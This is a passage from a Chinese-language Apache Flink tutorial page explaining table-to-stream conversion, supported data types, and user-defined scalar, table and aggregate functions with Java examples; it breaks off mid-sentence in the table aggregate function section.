class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tableEnv.createTemporaryView(<span class="string">"sensorTable"</span>,sensorDS, $(<span class="string">"id"</span>),$(<span class="string">"ts"</span>),$(<span class="string">"vc"</span>));</span><br><span class="line"><span class="comment">// 接下来就可以直接在SQL中引用表sensorTable了</span></span><br></pre></td></tr></table></figure><h4 id="将表（Table）转换成流（DataStream）">将表（Table）转换成流（DataStream）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 调用toDataStream()方法</span></span><br><span class="line"><span class="comment">// 经查询转换得到的表aliceClickTable转换成流打印输出</span></span><br><span class="line">tableEnv.toDataStream(table).print();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用toChangelogStream()方法</span></span><br><span class="line">Table table = tableEnv.sqlQuery(</span><br><span class="line">    <span class="string">"SELECT id, sum(vc) "</span> +</span><br><span class="line">    <span class="string">"FROM source "</span> +</span><br><span class="line">    <span class="string">"GROUP BY id "</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将表转换成更新日志流</span></span><br><span class="line">tableEnv.toChangelogStream(table).print();</span><br></pre></td></tr></table></figure><h4 id="支持的数据类型">支持的数据类型</h4><p><strong>（1）原子类型</strong></p><p>在Flink中，基础数据类型（Integer、Double、String）和通用数据类型（也就是不可再拆分的数据类型）统一称作“原子类型”。原子类型的DataStream，转换之后就成了只有一列的Table，列字段（field）的数据类型可以由原子类型推断出。另外，还可以在fromDataStream()方法里增加参数，用来重新命名列字段</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">StreamTableEnvironment tableEnv = ...;</span><br><span class="line">DataStream&lt;Long&gt; stream = ...;</span><br><span class="line"><span class="comment">// 将数据流转换成动态表，动态表只有一个字段，重命名为myLong</span></span><br><span class="line">Table table = tableEnv.fromDataStream(stream, $(<span class="string">"myLong"</span>));</span><br></pre></td></tr></table></figure><p><strong>（2）Tuple类型</strong></p><p>当原子类型不做重命名时，默认的字段名就是“f0”，容易想到，这其实就是将原子类型看作了一元组Tuple1的处理结果。Table支持Flink中定义的元组类型Tuple，对应在表中字段名默认就是元组中元素的属性名f0、f1、f2…。所有字段都可以被重新排序，也可以提取其中的一部分字段。字段还可以通过调用表达式的as()方法来进行重命名。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">StreamTableEnvironment tableEnv = ...;</span><br><span class="line">DataStream&lt;Tuple2&lt;Long, Integer&gt;&gt; stream = ...;</span><br><span class="line"><span class="comment">// 将数据流转换成只包含f1字段的表</span></span><br><span class="line">Table table = tableEnv.fromDataStream(stream, $(<span class="string">"f1"</span>));</span><br><span class="line"><span class="comment">// 将数据流转换成包含f0和f1字段的表，在表中f0和f1位置交换</span></span><br><span class="line">Table table = tableEnv.fromDataStream(stream, $(<span class="string">"f1"</span>), $(<span class="string">"f0"</span>));</span><br><span class="line"><span class="comment">// 将f1字段命名为myInt，f0命名为myLong</span></span><br><span class="line">Table table = tableEnv.fromDataStream(stream, $(<span class="string">"f1"</span>).as(<span class="string">"myInt"</span>), $(<span class="string">"f0"</span>).as(<span class="string">"myLong"</span>));</span><br></pre></td></tr></table></figure><p><strong>（3）POJO 类型</strong></p><p>Flink也支持多种数据类型组合成的“复合类型”，最典型的就是简单Java对象（POJO 类型）。由于POJO中已经定义好了可读性强的字段名，这种类型的数据流转换成Table就显得无比顺畅了。将POJO类型的DataStream转换成Table，如果不指定字段名称，就会直接使用原始 POJO 类型中的字段名称。POJO中的字段同样可以被重新排序、提却和重命名。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">StreamTableEnvironment tableEnv = ...;</span><br><span class="line"></span><br><span class="line">DataStream&lt;Event&gt; stream = ...;</span><br><span class="line"></span><br><span class="line">Table table = tableEnv.fromDataStream(stream);</span><br><span class="line">Table table = tableEnv.fromDataStream(stream, $(<span class="string">"user"</span>));</span><br><span class="line">Table table = tableEnv.fromDataStream(stream, $(<span class="string">"user"</span>).as(<span class="string">"myUser"</span>), $(<span class="string">"url"</span>).as(<span class="string">"myUrl"</span>));</span><br></pre></td></tr></table></figure><p><strong>（4）Row类型</strong></p><p>Flink中还定义了一个在关系型表中更加通用的数据类型——行（Row），它是Table中数据的基本组织形式。Row类型也是一种复合类型，它的长度固定，而且无法直接推断出每个字段的类型，所以在使用时必须指明具体的类型信息；我们在创建Table时调用的CREATE语句就会将所有的字段名称和类型指定，这在Flink中被称为表的“模式结构”（Schema）。</p><h4 id="综合应用示例">综合应用示例</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TableStreamDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">        DataStreamSource&lt;WaterSensor&gt; sensorDS = env.fromElements(</span><br><span class="line">                <span class="keyword">new</span> WaterSensor(<span class="string">"s1"</span>, <span class="number">1L</span>, <span class="number">1</span>),</span><br><span class="line">                <span class="keyword">new</span> WaterSensor(<span class="string">"s1"</span>, <span class="number">2L</span>, <span class="number">2</span>),</span><br><span class="line">                <span class="keyword">new</span> WaterSensor(<span class="string">"s2"</span>, <span class="number">2L</span>, <span class="number">2</span>),</span><br><span class="line">                <span class="keyword">new</span> WaterSensor(<span class="string">"s3"</span>, <span class="number">3L</span>, <span class="number">3</span>),</span><br><span class="line">                <span class="keyword">new</span> WaterSensor(<span class="string">"s3"</span>, <span class="number">4L</span>, <span class="number">4</span>)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        StreamTableEnvironment tableEnv = StreamTableEnvironment.create(env);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO 1. 流转表</span></span><br><span class="line">        Table sensorTable = tableEnv.fromDataStream(sensorDS);</span><br><span class="line">        tableEnv.createTemporaryView(<span class="string">"sensor"</span>, sensorTable);</span><br><span class="line"></span><br><span class="line">        Table filterTable = tableEnv.sqlQuery(<span class="string">"select id,ts,vc from sensor where ts&gt;2"</span>);</span><br><span class="line">        Table sumTable = tableEnv.sqlQuery(<span class="string">"select id,sum(vc) from sensor group by id"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO 2. 表转流</span></span><br><span class="line">        <span class="comment">// 2.1 追加流</span></span><br><span class="line">        tableEnv.toDataStream(filterTable, WaterSensor.class).print("filter");</span><br><span class="line">        <span class="comment">// 2.2 changelog流(结果需要更新)</span></span><br><span class="line">        tableEnv.toChangelogStream(sumTable ).print(<span class="string">"sum"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 只要代码中调用了 DataStreamAPI，就需要 execute，否则不需要</span></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="9-7-自定义函数（UDF）">9.7 自定义函数（UDF）</h3><p>系统函数尽管庞大，也不可能涵盖所有的功能；如果有系统函数不支持的需求，我们就需要用自定义函数（User Defined Functions，UDF）来实现了。Flink的Table API和SQL提供了多种自定义函数的接口，以抽象类的形式定义。当前UDF主要有以下几类：</p><ul><li>标量函数（Scalar Functions）：将输入的标量值转换成一个新的标量值；</li><li>表函数（Table Functions）：将标量值转换成一个或多个新的行数据，也就是扩展成一个表；</li><li>聚合函数（Aggregate Functions）：将多行数据里的标量值转换成一个新的标量值；</li><li>表聚合函数（Table Aggregate Functions）：将多行数据里的标量值转换成一个或多个新的行数据。</li></ul><h4 id="整体调用流程">整体调用流程</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// （1）注册函数</span></span><br><span class="line"><span class="comment">// 注册函数时需要调用表环境的createTemporarySystemFunction()方法，传入注册的函数名以及UDF类的Class对象</span></span><br><span class="line">tableEnv.createTemporarySystemFunction(<span class="string">"MyFunction"</span>, MyFunction<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"><span class="comment">// （2）使用Table API调用函数</span></span><br><span class="line"><span class="comment">// 在Table API中，需要使用call()方法来调用自定义函数：</span></span><br><span class="line">ableEnv.from(<span class="string">"MyTable"</span>).select(call(<span class="string">"MyFunction"</span>, $(<span class="string">"myField"</span>)));</span><br><span class="line"><span class="comment">// 这里call()方法有两个参数，一个是注册好的函数名MyFunction，另一个则是函数调用时本身的参数。这里我们定义MyFunction在调用时，需要传入的参数是myField字段</span></span><br><span class="line"><span class="comment">// （3）在SQL中调用函数</span></span><br><span class="line"><span class="comment">// 当我们将函数注册为系统函数之后，在SQL中的调用就与内置系统函数完全一样了</span></span><br><span class="line">tableEnv.sqlQuery(<span class="string">"SELECT MyFunction(myField) FROM MyTable"</span>);</span><br></pre></td></tr></table></figure><h4 id="标量函数（Scalar-Functions）-v2">标量函数（Scalar Functions）</h4><p>想要实现自定义的标量函数，我们需要自定义一个类来继承抽象类ScalarFunction，并实现叫作eval() 的求值方法。标量函数的行为就取决于求值方法的定义，它必须是公有的（public），而且名字必须是eval。求值方法eval可以重载多次，任何数据类型都可作为求值方法的参数和返回值类型。</p><p>这里需要特别说明的是，ScalarFunction抽象类中并没有定义eval()方法，所以我们不能直接在代码中重写（override）；但Table API的框架底层又要求了求值方法必须名字为eval()。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyScalarFunctionDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        DataStreamSource&lt;WaterSensor&gt; sensorDS = env.fromElements(</span><br><span class="line">                <span class="keyword">new</span> WaterSensor(<span class="string">"s1"</span>, <span class="number">1L</span>, <span class="number">1</span>),</span><br><span class="line">                <span class="keyword">new</span> WaterSensor(<span class="string">"s1"</span>, <span class="number">2L</span>, <span class="number">2</span>),</span><br><span class="line">                <span class="keyword">new</span> WaterSensor(<span class="string">"s2"</span>, <span class="number">2L</span>, <span class="number">2</span>),</span><br><span class="line">                <span class="keyword">new</span> WaterSensor(<span class="string">"s3"</span>, <span class="number">3L</span>, <span class="number">3</span>),</span><br><span class="line">                <span class="keyword">new</span> WaterSensor(<span class="string">"s3"</span>, <span class="number">4L</span>, <span class="number">4</span>)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        StreamTableEnvironment tableEnv = StreamTableEnvironment.create(env);</span><br><span class="line"></span><br><span class="line">        Table sensorTable = tableEnv.fromDataStream(sensorDS);</span><br><span class="line">        tableEnv.createTemporaryView(<span class="string">"sensor"</span>, sensorTable);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO 2.注册函数</span></span><br><span class="line">        tableEnv.createTemporaryFunction(<span class="string">"HashFunction"</span>, HashFunction<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO 3.调用 自定义函数</span></span><br><span class="line">        <span class="comment">// 3.1 sql用法</span></span><br><span class="line"><span class="comment">//        tableEnv.sqlQuery("select HashFunction(id) from sensor")</span></span><br><span class="line"><span class="comment">//                .execute()  // 调用了 sql的execute，就不需要 env.execute()</span></span><br><span class="line"><span class="comment">//                .print();</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3.2 table api用法</span></span><br><span class="line">        sensorTable</span><br><span class="line">                .select(call(<span class="string">"HashFunction"</span>,$(<span class="string">"id"</span>)))</span><br><span class="line">                .execute()</span><br><span class="line">                .print();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// TODO 1.定义 自定义函数的实现类</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>  <span class="class"><span class="keyword">class</span> <span class="title">HashFunction</span> <span class="keyword">extends</span> <span class="title">ScalarFunction</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 接受任意类型的输入，返回 INT型输出</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">eval</span><span class="params">(@DataTypeHint(inputGroup = InputGroup.ANY)</span> Object o) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> o.hashCode();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们自定义了一个ScalarFunction，实现了eval()求值方法，将任意类型的对象传入，得到一个Int类型的哈希值返回。当然，具体的求哈希操作就省略了，直接调用对象的hashCode()方法即可。</p><p>另外注意，由于Table API在对函数进行解析时需要提取求值方法参数的类型引用，所以我们用DataTypeHint(inputGroup = InputGroup.ANY)对输入参数的类型做了标注，表示eval的参数可以是任意类型</p><h4 id="表函数（Table-Functions）">表函数（Table Functions）</h4><p>跟标量函数一样，表函数的输入参数也可以是 0个、1个或多个标量值；不同的是，它可以返回任意多行数据。“多行数据”事实上就构成了一个表，所以“表函数”可以认为就是返回一个表的函数，这是一个“一对多”的转换关系。之前我们介绍过的窗口TVF，本质上就是表函数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyTableFunctionDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">        DataStreamSource&lt;String&gt; strDS = env.fromElements(</span><br><span class="line">                <span class="string">"hello flink"</span>,</span><br><span class="line">                <span class="string">"hello world hi"</span>,</span><br><span class="line">                <span class="string">"hello java"</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        StreamTableEnvironment tableEnv = StreamTableEnvironment.create(env);</span><br><span class="line"></span><br><span class="line">        Table sensorTable = tableEnv.fromDataStream(strDS, $(<span class="string">"words"</span>));</span><br><span class="line">        tableEnv.createTemporaryView(<span class="string">"str"</span>, sensorTable);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO 2.注册函数</span></span><br><span class="line">        tableEnv.createTemporaryFunction(<span class="string">"SplitFunction"</span>, SplitFunction<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO 3.调用 自定义函数</span></span><br><span class="line">        <span class="comment">// 3.1 交叉联结</span></span><br><span class="line">        tableEnv</span><br><span class="line">                <span class="comment">// 3.1 交叉联结</span></span><br><span class="line"><span class="comment">//                .sqlQuery("select words,word,length from str,lateral table(SplitFunction(words))")</span></span><br><span class="line">                <span class="comment">// 3.2 带 on  true 条件的 左联结</span></span><br><span class="line"><span class="comment">//                .sqlQuery("select words,word,length from str left join lateral table(SplitFunction(words)) on true")</span></span><br><span class="line">                <span class="comment">// 重命名侧向表中的字段</span></span><br><span class="line">                .sqlQuery(<span class="string">"select words,newWord,newLength from str left join lateral table(SplitFunction(words))  as T(newWord,newLength) on true"</span>)</span><br><span class="line">                .execute()</span><br><span class="line">                .print();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// TODO 1.继承 TableFunction&lt;返回的类型&gt;</span></span><br><span class="line">    <span class="comment">// 类型标注： Row包含两个字段：word和length</span></span><br><span class="line">    <span class="meta">@FunctionHint</span>(output = <span class="meta">@DataTypeHint</span>(<span class="string">"ROW&lt;word STRING,length INT&gt;"</span>))</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SplitFunction</span> <span class="keyword">extends</span> <span class="title">TableFunction</span>&lt;<span class="title">Row</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 返回是 void，用 collect方法输出</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eval</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">for</span> (String word : str.split(<span class="string">" "</span>)) &#123;</span><br><span class="line">                collect(Row.of(word, word.length()));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们直接将表函数的输出类型定义成了ROW，这就是得到的侧向表中的数据类型；每行数据转换后也只有一行。我们分别用交叉联结和左联结两种方式在SQL中进行了调用，还可以对侧向表的中字段进行重命名</p><h4 id="聚合函数（Aggregate-Functions）-v2">聚合函数（Aggregate Functions）</h4><p>用户自定义聚合函数（User Defined AGGregate function，UDAGG）会把一行或多行数据（也就是一个表）聚合成一个标量值。这是一个标准的“多对一”的转换。聚合函数的概念我们之前已经接触过多次，如SUM()、MAX()、MIN()、AVG()、COUNT()都是常见的系统内置聚合函数。而如果有些需求无法直接调用系统函数解决，我们就必须自定义聚合函数来实现功能了。</p><p>自定义聚合函数需要继承抽象类AggregateFunction。AggregateFunction有两个泛型参数&lt;T, ACC&gt;，T表示聚合输出的结果类型，ACC则表示聚合的中间状态类型。Flink SQL中的聚合函数的工作原理如下：</p><p>（1）首先，它需要创建一个累加器（accumulator），用来存储聚合的中间结果。这与DataStream API中的AggregateFunction非常类似，累加器就可以看作是一个聚合状态。调用createAccumulator()方法可以创建一个空的累加器。</p><p>（2）对于输入的每一行数据，都会调用accumulate()方法来更新累加器，这是聚合的核心过程。</p><p>（3）当所有的数据都处理完之后，通过调用getValue()方法来计算并返回最终的结果。</p><p>所以，每个 AggregateFunction 都必须实现以下几个方法：</p><ul><li>createAccumulator()</li></ul><p>这是创建累加器的方法。没有输入参数，返回类型为累加器类型ACC。</p><ul><li>accumulate()</li></ul><p>这是进行聚合计算的核心方法，每来一行数据都会调用。它的第一个参数是确定的，就是当前的累加器，类型为ACC，表示当前聚合的中间状态；后面的参数则是聚合函数调用时传入的参数，可以有多个，类型也可以不同。这个方法主要是更新聚合状态，所以没有返回类型。需要注意的是，accumulate()与之前的求值方法eval()类似，也是底层架构要求的，必须为public，方法名必须为accumulate，且无法直接override、只能手动实现。</p><ul><li>getValue()</li></ul><p>这是得到最终返回结果的方法。输入参数是ACC类型的累加器，输出类型为T。在遇到复杂类型时，Flink 的类型推导可能会无法得到正确的结果。所以AggregateFunction也可以专门对累加器和返回结果的类型进行声明，这是通过 getAccumulatorType()和getResultType()两个方法来指定的。</p><p>AggregateFunction 的所有方法都必须是 公有的（public），不能是静态的（static），而且名字必须跟上面写的完全一样。createAccumulator、getValue、getResultType 以及 getAccumulatorType 这几个方法是在抽象类 AggregateFunction 中定义的，可以override；而其他则都是底层架构约定的方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 学生的分数表ScoreTable中计算每个学生的加权平均分</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyAggregateFunctionDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//  姓名，分数，权重</span></span><br><span class="line">        DataStreamSource&lt;Tuple3&lt;String,Integer, Integer&gt;&gt; scoreWeightDS = env.fromElements(</span><br><span class="line">                Tuple3.of(<span class="string">"zs"</span>,<span class="number">80</span>, <span class="number">3</span>),</span><br><span class="line">                Tuple3.of(<span class="string">"zs"</span>,<span class="number">90</span>, <span class="number">4</span>),</span><br><span class="line">                Tuple3.of(<span class="string">"zs"</span>,<span class="number">95</span>, <span class="number">4</span>),</span><br><span class="line">                Tuple3.of(<span class="string">"ls"</span>,<span class="number">75</span>, <span class="number">4</span>),</span><br><span class="line">                Tuple3.of(<span class="string">"ls"</span>,<span class="number">65</span>, <span class="number">4</span>),</span><br><span class="line">                Tuple3.of(<span class="string">"ls"</span>,<span class="number">85</span>, <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        StreamTableEnvironment tableEnv = StreamTableEnvironment.create(env);</span><br><span class="line"></span><br><span class="line">        Table scoreWeightTable = tableEnv.fromDataStream(scoreWeightDS, $(<span class="string">"f0"</span>).as(<span class="string">"name"</span>),$(<span class="string">"f1"</span>).as(<span class="string">"score"</span>), $(<span class="string">"f2"</span>).as(<span class="string">"weight"</span>));</span><br><span class="line">        tableEnv.createTemporaryView(<span class="string">"scores"</span>, scoreWeightTable);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO 2.注册函数</span></span><br><span class="line">        tableEnv.createTemporaryFunction(<span class="string">"WeightedAvg"</span>, WeightedAvg<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO 3.调用 自定义函数</span></span><br><span class="line">        tableEnv</span><br><span class="line">                .sqlQuery(<span class="string">"select name,WeightedAvg(score,weight)  from scores group by name"</span>)</span><br><span class="line">                .execute()</span><br><span class="line">                .print();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// TODO 1.继承 AggregateFunction&lt; 返回类型，累加器类型&lt;加权总和，权重总和&gt; &gt;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">WeightedAvg</span> <span class="keyword">extends</span> <span class="title">AggregateFunction</span>&lt;<span class="title">Double</span>, <span class="title">Tuple2</span>&lt;<span class="title">Integer</span>, <span class="title">Integer</span>&gt;&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Double <span class="title">getValue</span><span class="params">(Tuple2&lt;Integer, Integer&gt; integerIntegerTuple2)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> integerIntegerTuple2.f0 * <span class="number">1</span>D / integerIntegerTuple2.f1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Tuple2&lt;Integer, Integer&gt; <span class="title">createAccumulator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> Tuple2.of(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 累加计算的方法，每来一行数据都会调用一次</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@param</span> acc 累加器类型</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@param</span> score 第一个参数：分数</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@param</span> weight 第二个参数：权重</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">accumulate</span><span class="params">(Tuple2&lt;Integer, Integer&gt; acc,Integer score,Integer weight)</span></span>&#123;</span><br><span class="line">            acc.f0 += score * weight;  <span class="comment">// 加权总和 =  分数1 * 权重1 + 分数2 * 权重2 +....</span></span><br><span class="line">            acc.f1 += weight;         <span class="comment">// 权重和 = 权重1 + 权重2 +....</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="表聚合函数（Table-Aggregate-Functions）">表聚合函数（Table Aggregate Functions）</h4><p>用户自定义表聚合函数（UDTAGG）可以把一行或多行数据（也就是一个表）聚合成另一张表，结果表中可以有多行多列。很明显，这就像表函数和聚合函数的结合体，是一个“多对多”的转换。</p><p>自定义表聚合函数需要继承抽象类TableAggregateFunction。TableAggregateFunction的结构和原理与AggregateFunction非常类似，同样有两个泛型参数&lt;T, 